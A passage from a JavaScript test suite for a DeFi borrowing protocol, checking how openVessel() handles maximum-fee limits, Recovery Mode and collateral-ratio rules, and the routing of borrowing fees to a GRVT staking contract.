				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			// Artificially make baseRate 5%
			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)
			// Check baseRate is now non-zero
			// assert.isTrue(baseRate_1.gt(toBN("0")))
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))
			const lastFeeOpTime_1_Asset = await vesselManager.lastFeeOperationTime(erc20.address)
			// Borrower D triggers a fee
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(1, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})
			const lastFeeOpTime_2_Asset = await vesselManager.lastFeeOperationTime(erc20.address)
			// Check that the last fee operation time did not update, as borrower D's debt issuance occured
			// since before minimum interval had passed
			assert.isTrue(lastFeeOpTime_2.eq(lastFeeOpTime_1))
			assert.isTrue(lastFeeOpTime_2_Asset.eq(lastFeeOpTime_1_Asset))
			// 1 minute passes
			th.fastForwardTime(60, web3.currentProvider)
			// Check that now, at least one minute has passed since lastFeeOpTime_1
			const timeNow = await th.getLatestBlockTimestamp(web3)
			assert.isTrue(toBN(timeNow).sub(lastFeeOpTime_1).gte(3600))
			assert.isTrue(toBN(timeNow).sub(lastFeeOpTime_1_Asset).gte(3600))
			// Borrower E triggers a fee
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(1, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: E },
			})
			const lastFeeOpTime_3_Asset = await vesselManager.lastFeeOperationTime(erc20.address)
			// Check that the last fee operation time DID update, as borrower's debt issuance occured
			// after minimum interval had passed
			assert.isTrue(lastFeeOpTime_3.gt(lastFeeOpTime_1))
			assert.isTrue(lastFeeOpTime_3_Asset.gt(lastFeeOpTime_1_Asset))
		})
		it("openVessel(): reverts if max fee > 100%", async () => {
			await assertRevert(
				borrowerOperations.openVessel(
					erc20.address,
					dec(1000, "ether"),
					dec(2, 18),
					dec(10000, 18),
					A,
					A,
					{ from: A }
				),
				"Max fee percentage must be between 0.5% and 100%"
			)
			await assertRevert(
				borrowerOperations.openVessel(
					erc20.address,
					dec(1000, "ether"),
					"1000000000000000001",
					dec(20000, 18),
					B,
					B,
					{ from: B }
				),
				"Max fee percentage must be between 0.5% and 100%"
			)
		})
		it("openVessel(): reverts if max fee < 0.5% in Normal mode", async () => {
			await assertRevert(
				borrowerOperations.openVessel(
					erc20.address,
					dec(1200, "ether"),
					0,
					dec(195000, 18),
					A,
					A,
					{ from: A }
				),
				"Max fee percentage must be between 0.5% and 100%"
			)
			await assertRevert(
				borrowerOperations.openVessel(
					erc20.address,
					dec(1000, "ether"),
					1,
					dec(195000, 18),
					A,
					A,
					{ from: A }
				),
				"Max fee percentage must be between 0.5% and 100%"
			)
			await assertRevert(
				borrowerOperations.openVessel(
					erc20.address,
					dec(1200, "ether"),
					"4999999999999999",
					dec(195000, 18),
					B,
					B,
					{ from: B }
				),
				"Max fee percentage must be between 0.5% and 100%"
			)
		})
		it("openVessel(): allows max fee < 0.5% in Recovery Mode", async () => {
			await borrowerOperations.openVessel(
				erc20.address,
				dec(2000, "ether"),
				dec(195000, 18),
				A,
				A,
				{ from: A }
			)
			await priceFeed.setPrice(erc20.address, dec(100, 18))
			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))
			await borrowerOperations.openVessel(
				erc20.address,
				dec(3100, "ether"),
				0,
				dec(19500, 18),
				B,
				B,
				{ from: B }
			)
			await priceFeed.setPrice(erc20.address, dec(50, 18))
			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))
			await borrowerOperations.openVessel(
				erc20.address,
				dec(3100, "ether"),
				1,
				dec(19500, 18),
				C,
				C,
				{ from: C }
			)
			await priceFeed.setPrice(erc20.address, dec(25, 18))
			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))
			await borrowerOperations.openVessel(
				erc20.address,
				dec(3100, "ether"),
				"4999999999999999",
				dec(19500, 18),
				D,
				D,
				{ from: D }
			)
		})
		it("openVessel(): reverts if fee exceeds max fee percentage", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			const totalSupply = await debtToken.totalSupply()
			// Artificially make baseRate 5%
			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)
			//       actual fee percentage: 0.005000000186264514
			// user's max fee percentage:  0.0049999999999999999
			assert.equal(borrowingRate, dec(5, 16))
			let borrowingRate_Asset = await vesselManager.getBorrowingRate(erc20.address) // expect max(0.5 + 5%, 5%) rate
			assert.equal(borrowingRate_Asset, dec(5, 16))
			const lessThan5pct = "49999999999999999"
			await assertRevert(
				borrowerOperations.openVessel(
					erc20.address,
					dec(1000, "ether"),
					lessThan5pct,
					dec(30000, 18),
					A,
					A,
					{ from: D }
				),
				"Fee exceeded provided maximum"
			)
			assert.equal(borrowingRate, dec(5, 16))
			borrowingRate_Asset = await vesselManager.getBorrowingRate(erc20.address) // expect 5% rate
			assert.equal(borrowingRate_Asset, dec(5, 16))
			// Attempt with maxFee 1%
			await assertRevert(
				borrowerOperations.openVessel(
					erc20.address,
					dec(1000, "ether"),
					dec(1, 16),
					dec(30000, 18),
					A,
					A,
					{ from: D }
				),
				"Fee exceeded provided maximum"
			)
			assert.equal(borrowingRate, dec(5, 16))
			assert.equal(borrowingRate_Asset, dec(5, 16))
			// Attempt with maxFee 3.754%
			await assertRevert(
				borrowerOperations.openVessel(
					erc20.address,
					dec(1000, "ether"),
					dec(3754, 13),
					dec(30000, 18),
					A,
					A,
					{ from: D }
				),
				"Fee exceeded provided maximum"
			)
			assert.equal(borrowingRate, dec(5, 16))
			borrowingRate_Asset = await vesselManager.getBorrowingRate(erc20.address) // expect 5% rate
			assert.equal(borrowingRate_Asset, dec(5, 16))
			// Attempt with maxFee 1e-16%
			await assertRevert(
				borrowerOperations.openVessel(
					erc20.address,
					dec(1000, "ether"),
					dec(5, 15),
					dec(30000, 18),
					A,
					A,
					{ from: D }
				),
				"Fee exceeded provided maximum"
			)
		})
		it("openVessel(): succeeds when fee is less than max fee percentage", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			// Artificially make baseRate 5%
			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)
			assert.equal(borrowingRate, dec(5, 16))
			let borrowingRate_Asset = await vesselManager.getBorrowingRate(erc20.address) // expect min(0.5 + 5%, 5%) rate
			assert.equal(borrowingRate_Asset, dec(5, 16))
			// Attempt with maxFee > 5%
			const moreThan5pct = "50000000000000001"
			assert.isTrue(tx1.receipt.status)
			const tx1_Asset = await borrowerOperations.openVessel(
				erc20.address,
				dec(100, "ether"),
				moreThan5pct,
				dec(10000, 18),
				A,
				A,
				{ from: D }
			)
			assert.isTrue(tx1_Asset.receipt.status)
			assert.equal(borrowingRate, dec(5, 16))
			borrowingRate_Asset = await vesselManager.getBorrowingRate(erc20.address) // expect 5% rate
			assert.equal(borrowingRate_Asset, dec(5, 16))
			// Attempt with maxFee = 5%
			assert.isTrue(tx2.receipt.status)
			const tx2_Asset = await borrowerOperations.openVessel(
				erc20.address,
				dec(100, "ether"),
				dec(5, 16),
				dec(10000, 18),
				A,
				A,
				{ from: H }
			)
			assert.isTrue(tx2_Asset.receipt.status)
			assert.equal(borrowingRate, dec(5, 16))
			borrowingRate_Asset = await vesselManager.getBorrowingRate(erc20.address) // expect 5% rate
			assert.equal(borrowingRate, dec(5, 16))
			// Attempt with maxFee 10%
			assert.isTrue(tx3.receipt.status)
			const tx3_Asset = await borrowerOperations.openVessel(
				erc20.address,
				dec(100, "ether"),
				dec(1, 17),
				dec(10000, 18),
				A,
				A,
				{ from: E }
			)
			assert.isTrue(tx3_Asset.receipt.status)
			assert.equal(borrowingRate, dec(5, 16))
			borrowingRate_Asset = await vesselManager.getBorrowingRate(erc20.address) // expect 5% rate
			assert.equal(borrowingRate_Asset, dec(5, 16))
			// Attempt with maxFee 37.659%
			assert.isTrue(tx4.receipt.status)
			const tx4_Asset = await borrowerOperations.openVessel(
				erc20.address,
				dec(100, "ether"),
				dec(37659, 13),
				dec(10000, 18),
				A,
				A,
				{ from: F }
			)
			assert.isTrue(tx4_Asset.receipt.status)
			// Attempt with maxFee 100%
			assert.isTrue(tx5.receipt.status)
			const tx5_Asset = await borrowerOperations.openVessel(
				erc20.address,
				dec(100, "ether"),
				dec(1, 18),
				dec(10000, 18),
				A,
				A,
				{ from: G }
			)
			assert.isTrue(tx5_Asset.receipt.status)
		})
		it("openVessel(): borrower can't grief the baseRate and stop it decaying by issuing debt at higher frequency than the decay granularity", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			// Artificially make baseRate 5%
			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)
			// Check baseRate is non-zero
			// assert.isTrue(baseRate_1.gt(toBN("0")))
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))
			// 59 minutes pass
			th.fastForwardTime(3540, web3.currentProvider)
			// Assume Borrower also owns accounts D and E
			// Borrower triggers a fee, before decay interval has passed
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(1, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})
			// 1 minute pass
			th.fastForwardTime(3540, web3.currentProvider)
			// Borrower triggers another fee
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(1, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: E },
			})
			// Check base rate has decreased even though Borrower tried to stop it decaying
			assert.isTrue(baseRate_2.lt(baseRate_1))
			const baseRate_2_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_2_Asset.lt(baseRate_1_Asset))
		}) */

		it("openVessel(): borrowing at non-zero base rate sends VUSD fee to GRVT staking contract", async () => {
			// time fast-forwards 1 year, and multisig stakes 1 GRVT
			await th.fastForwardTime(timeValues.SECONDS_IN_ONE_YEAR, web3.currentProvider)
			await grvtToken.approve(grvtStaking.address, dec(1, 18), { from: multisig })
			await grvtStaking.stake(dec(1, 18), { from: multisig })

			// Check GRVT VUSD balance before == 0
			const GRVTStaking_VUSDBalance_Before = await debtToken.balanceOf(grvtStaking.address)
			assert.equal(GRVTStaking_VUSDBalance_Before, "0")

			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})

			// Artificially make baseRate 5%

			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)

			// Check baseRate is now non-zero
			// assert.isTrue(baseRate_1.gt(toBN("0")))

			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))

			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)

			// D opens vessel
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})

			// Check GRVT VUSD balance after has increased
			const GRVTStaking_VUSDBalance_After = await debtToken.balanceOf(grvtStaking.address)
			assert.isTrue(GRVTStaking_VUSDBalance_After.gt(GRVTStaking_VUSDBalance_Before))
		})

		if (!withProxy) {
			// TODO: use rawLogs instead of logs
			it("openVessel(): borrowing at non-zero base records the (drawn debt + fee  + liq. reserve) on the Vessel struct", async () => {
				// time fast-forwards 1 year, and multisig stakes 1 GRVT
				await th.fastForwardTime(timeValues.SECONDS_IN_ONE_YEAR, web3.currentProvider)
				await grvtToken.approve(grvtStaking.address, dec(1, 18), { from: multisig })
				await grvtStaking.stake(dec(1, 18), { from: multisig })

				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(10000, 18)),
					ICR: toBN(dec(10, 18)),
					extraParams: { from: whale },
				})
				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(20000, 18)),
					ICR: toBN(dec(2, 18)),
					extraParams: { from: A },
				})
				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(30000, 18)),
					ICR: toBN(dec(2, 18)),
					extraParams: { from: B },
				})
				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(40000, 18)),
					ICR: toBN(dec(2, 18)),
					extraParams: { from: C },
				})

				// Artificially make baseRate 5%

				// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
				// await vesselManager.setLastFeeOpTimeToNow(erc20.address)

				// Check baseRate is now non-zero
				// assert.isTrue(baseRate_1.gt(toBN("0")))

				const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
				assert.isTrue(baseRate_1_Asset.gt(toBN("0")))

				// 2 hours pass
				th.fastForwardTime(7200, web3.currentProvider)

				const D_VUSDRequest = toBN(dec(20000, 18))

				// D withdraws VUSD
				const openVesselTx_Asset = await borrowerOperations.openVessel(
					erc20.address,
					dec(200, "ether"),
					D_VUSDRequest,
					erc20.address,
					erc20.address,
					{ from: D }
				)

				const emittedFee_Asset = toBN(th.getVUSDFeeFromVUSDBorrowingEvent(openVesselTx_Asset))
				assert.isTrue(toBN(emittedFee_Asset).gt(toBN("0")))

				const newDebt_Asset = (await vesselManager.Vessels(D, erc20.address))[th.VESSEL_DEBT_INDEX]

				// Check debt on Vessel struct equals drawn debt plus emitted fee

				th.assertIsApproximatelyEqual(
					newDebt_Asset,
					D_VUSDRequest.add(emittedFee_Asset).add(VUSD_GAS_COMPENSATION_ERC20),
					100000
				)
			})
		}

		it("openVessel(): borrowing at non-zero base rate increases the GRVT staking contract VUSD fees-per-unit-staked", async () => {
			// time fast-forwards 1 year, and multisig stakes 1 GRVT
			await th.fastForwardTime(timeValues.SECONDS_IN_ONE_YEAR, web3.currentProvider)
			await grvtToken.approve(grvtStaking.address, dec(1, 18), { from: multisig })
			await grvtStaking.stake(dec(1, 18), { from: multisig })

			// Check GRVT contract VUSD fees-per-unit-staked is zero
			const F_VUSD_Before = await grvtStaking.F_DEBT_TOKENS()
			assert.equal(F_VUSD_Before, "0")

			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})

			// Artificially make baseRate 5%

			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)

			// Check baseRate is now non-zero
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))

			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)

			// D opens vessel
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(37, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})

			// Check GRVT contract VUSD fees-per-unit-staked has increased
			const F_VUSD_After = await grvtStaking.F_DEBT_TOKENS()
			assert.isTrue(F_VUSD_After.gt(F_VUSD_Before))
		})

		it("openVessel(): borrowing at non-zero base rate sends requested amount to the user", async () => {
			// time fast-forwards 1 year, and multisig stakes 1 GRVT
			await th.fastForwardTime(timeValues.SECONDS_IN_ONE_YEAR, web3.currentProvider)
			await grvtToken.approve(grvtStaking.address, dec(1, 18), { from: multisig })
			await grvtStaking.stake(dec(1, 18), { from: multisig })

			// Check GRVT Staking contract balance before == 0
			const GRVTStaking_VUSDBalance_Before = await debtToken.balanceOf(grvtStaking.address)
			assert.equal(GRVTStaking_VUSDBalance_Before, "0")

			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})

			// Artificially make baseRate 5%

			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)

			// Check baseRate is non-zero
			// assert.isTrue(baseRate_1.gt(toBN("0")))

			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))

			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)

			// D opens vessel
			const VUSDRequest_D = toBN(dec(40000, 18))
			await borrowerOperations.openVessel(erc20.address, dec(500, "ether"), VUSDRequest_D, D, D, { from: D })

			// Check GRVT staking VUSD balance has increased
			const GRVTStaking_VUSDBalance_After = await debtToken.balanceOf(grvtStaking.address)
			assert.isTrue(GRVTStaking_VUSDBalance_After.gt(GRVTStaking_VUSDBalance_Before))

			// Check D's VUSD balance now equals their requested VUSD
			const VUSDBalance_D = await debtToken.balanceOf(D)
			assert.isTrue(VUSDRequest_D.eq(VUSDBalance_D))
		})
		// Logic changed
		it("openVessel(): borrowing at zero fee doesn't change the GRVT staking contract VUSD fees-per-unit-staked", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})

			// Check baseRate is zero
			// assert.equal(baseRate_1, "0")
			await adminContract.setBorrowingFee(erc20.address, 0)
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.equal(baseRate_1_Asset, "0")

			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)

			// Check VUSD reward per GRVT staked == 0
			const F_VUSD_Before = await grvtStaking.F_DEBT_TOKENS()
			assert.equal(F_VUSD_Before, "0")

			// A stakes GRVT
			await grvtToken.unprotectedMint(A, dec(100, 18))
			await grvtStaking.stake(dec(100, 18), { from: A })

			// D opens vessel
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(37, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})

			// Check VUSD reward per GRVT staked > 0
			const F_VUSD_After = await grvtStaking.F_DEBT_TOKENS()
			assert.isTrue(F_VUSD_After.eq(toBN("0")))
		})

		/* it("openVessel(): Borrowing at zero base rate charges minimum fee", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			const VUSDRequest = toBN(dec(10000, 18))
			const _VUSDFee = toBN(th.getEventArgByName(txC, "VUSDBorrowingFeePaid", "_VUSDFee"))
			const _VUSDFee_Asset = toBN(
				th.getEventArgByName(txC_Asset, "VUSDBorrowingFeePaid", "_VUSDFee")
			)
			const expectedFee = BORROWING_FEE_FLOOR.mul(toBN(VUSDRequest)).div(toBN(dec(1, 18)))
			const expectedFee_Asset = BORROWING_FEE_FLOOR_ERC20.mul(toBN(VUSDRequest)).div(
				toBN(dec(1, 18))
			)
			assert.isTrue(_VUSDFee.eq(expectedFee))
			assert.isTrue(_VUSDFee_Asset.eq(expectedFee_Asset))
		}) */

		it("openVessel(): reverts when system is in Recovery Mode and ICR < CCR", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			// price drops, and Recovery Mode kicks in
			await priceFeed.setPrice(erc20.address, dec(105, 18))

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			// Bob tries to open a vessel with 149% ICR during Recovery Mode

			// Bob tries to open a vessel with 149% ICR during Recovery Mode
			try {
				const txBob_Asset = await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(5000, 18)),
					ICR: toBN(dec(149, 16)),
					extraParams: { from: alice },
				})
				assert.isFalse(txBob_Asset.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("openVessel(): reverts when vessel ICR < MCR", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			// Bob attempts to open a 109% ICR vessel in Normal Mode

			try {
				const txBob = (
					await openVessel({
						asset: erc20.address,
						extraVUSDAmount: toBN(dec(5000, 18)),
						ICR: toBN(dec(109, 16)),
						extraParams: { from: bob },
					})
				).tx
				assert.isFalse(txBob.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}

			// price drops, and Recovery Mode kicks in
			await priceFeed.setPrice(erc20.address, dec(105, 18))

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			// Bob attempts to open a 109% ICR vessel in Recovery Mode

			try {
				const txBob = await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(5000, 18)),
					ICR: toBN(dec(109, 16)),
					extraParams: { from: bob },
				})
				assert.isFalse(txBob.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("openVessel(): reverts when opening the vessel would cause the TCR of the system to fall below the CCR", async () => {
			await priceFeed.setPrice(erc20.address, dec(100, 18))

			// Alice creates vessel with 150% ICR.  System TCR = 150%.
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(15, 17)),
				extraParams: { from: alice },
			})

			const TCR_Asset = await th.getTCR(contracts, erc20.address)
			assert.equal(TCR_Asset, dec(150, 16))

			// Bob attempts to open a vessel with ICR = 149%
			// System TCR would fall below 150%

			try {
				const txBob = await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(5000, 18)),
					ICR: toBN(dec(149, 16)),
					extraParams: { from: bob },
				})
				assert.isFalse(txBob.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("openVessel(): reverts if vessel is already active", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(15, 17)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(15, 17)),
				extraParams: { from: bob },
			})

			try {
				const txB_1 = await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(5000, 18)),
					ICR: toBN(dec(3, 18)),
					extraParams: { from: bob },
				})
				assert.isFalse(txB_1.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}

			try {
				const txB_2 = await openVessel({
					asset: erc20.address,
					ICR: toBN(dec(2, 18)),
					extraParams: { from: alice },
				})
				assert.isFalse(txB_2.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("openVessel(): Can open a vessel with ICR >= CCR when system is in Recovery Mode", async () => {
			// --- SETUP ---
			//  Alice and Bob add coll and withdraw such  that the TCR is ~150%

			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(15, 17)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(15, 17)),
				extraParams: { from: bob },
			})

			const TCR_Asset = (await th.getTCR(contracts, erc20.address)).toString()
			assert.equal(TCR_Asset, "1500000000000000000")

			// price drops to 1ETH:100VUSD, reducing TCR below 150%
			await priceFeed.setPrice(erc20.address, "100000000000000000000")
			const price = await priceFeed.getPrice(erc20.address)

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			// Carol opens at 150% ICR in Recovery Mode
			const txCarol_Asset = (
				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(5000, 18)),
					ICR: toBN(dec(15, 17)),
					extraParams: { from: carol },
				})
			).tx
			assert.isTrue(txCarol_Asset.receipt.status)
			assert.isTrue(await sortedVessels.contains(erc20.address, carol))

			const carol_VesselStatus_Asset = await vesselManager.getVesselStatus(erc20.address, carol)
			assert.equal(carol_VesselStatus_Asset, 1)

			const carolICR_Asset = await vesselManager.getCurrentICR(erc20.address, carol, price)
			assert.isTrue(carolICR_Asset.gt(toBN(dec(150, 16))))
		})

		it("openVessel(): Reverts opening a vessel with min debt when system is in Recovery Mode", async () => {
			// --- SETUP ---
			//  Alice and Bob add coll and withdraw such  that the TCR is ~150%

			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(15, 17)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(15, 17)),
				extraParams: { from: bob },
			})

			const TCR_Asset = (await th.getTCR(contracts, erc20.address)).toString()
			assert.equal(TCR_Asset, "1500000000000000000")

			// price drops to 1ETH:100VUSD, reducing TCR below 150%
			await priceFeed.setPrice(erc20.address, "100000000000000000000")

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			await assertRevert(
				borrowerOperations.openVessel(
					erc20.address,
					dec(1, "ether"),
					await getNetBorrowingAmount(MIN_NET_DEBT_ERC20, erc20.address),
					carol,
					carol,
					{ from: carol }
				)
			)
		})

		it("openVessel(): creates a new Vessel and assigns the correct collateral and debt amount", async () => {
			const debt_Before_Asset = await getVesselEntireDebt(alice, erc20.address)
			const coll_Before_Asset = await getVesselEntireColl(alice, erc20.address)
			const status_Before_Asset = await vesselManager.getVesselStatus(erc20.address, alice)

			// check coll and debt before

			assert.equal(debt_Before_Asset, 0)
			assert.equal(coll_Before_Asset, 0)
			// check non-existent status
			assert.equal(status_Before_Asset, 0)

